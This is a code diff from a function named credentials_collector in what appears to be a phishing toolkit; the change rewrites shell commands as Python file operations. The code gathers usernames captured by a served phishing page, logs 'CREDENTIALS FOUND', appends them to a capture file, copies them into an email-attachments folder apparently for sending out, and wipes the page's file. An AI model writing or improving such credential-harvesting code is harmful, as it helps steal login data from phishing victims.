@@ -60,8 +60,22 @@ def credentials_collector(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log_writer('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
-                run_command("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")
+                #run_command("touch Server/CapturedData/usernames.txt 
+                pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
+                
+                # && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt 
+                captured_usernames = open('Server/CapturedData/usernames.txt', 'a')
+                new_usernames = open('Server/www/usernames.txt')
+                captured_usernames.write(new_usernames.read())
+                new_usernames.close()
+                captured_usernames.close()
+                # && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt 
+                copyfile('Server/CapturedData/usernames.txt', 'Defs/FeatureManager/EmailManager/attachments/usernames.txt')
 
+                # && echo -n '' > Server/www/usernames.txt")
+                new_usernames = open('Server/www/usernames.txt', 'w')
+                new_usernames.write('')
+                new_usernames.close()
 
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
